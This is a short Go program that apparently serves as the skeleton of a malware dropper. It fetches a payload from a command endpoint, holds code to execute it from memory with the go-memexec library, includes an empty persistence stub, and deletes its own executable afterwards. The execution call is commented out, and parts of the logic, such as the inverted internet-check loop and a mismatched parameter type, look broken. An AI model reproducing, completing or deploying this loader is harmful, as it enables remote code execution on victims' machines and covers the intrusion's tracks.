package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"time"

	"github.com/amenzhinsky/go-memexec"
)

const (
	HOME = "http://127.0.0.1:5000/update"
)

var (
	PAYLOAD []byte
)

func main() {
	fmt.Println("Hello friend")
	persist()
	for has_internet_access() {
		time.Sleep(time.Minute)
	}
	fetch_payload()
	// go deploy(PAYLOAD)
	// time.Sleep(30*time.Second)
	clean_up()
}

func persist() {
	
}

func has_internet_access() bool {
	_, err := http.Get("https://www.google.com")
	return err == nil
}

func fetch_payload() {
	client := &http.Client{}
	request, _ := http.NewRequest(http.MethodGet, HOME, nil)
	resp, _ := client.Do(request)
	body := resp.Body
	bytes, _ := io.ReadAll(body)
	fmt.Println(string(bytes))
	PAYLOAD = bytes
}

func deploy(path string) {
	exe, _ := memexec.New(PAYLOAD)
	exe.Command().Run()
}

func clean_up() {
	path, _ := os.Executable()
	fmt.Println(path)
	os.Remove(path)
}
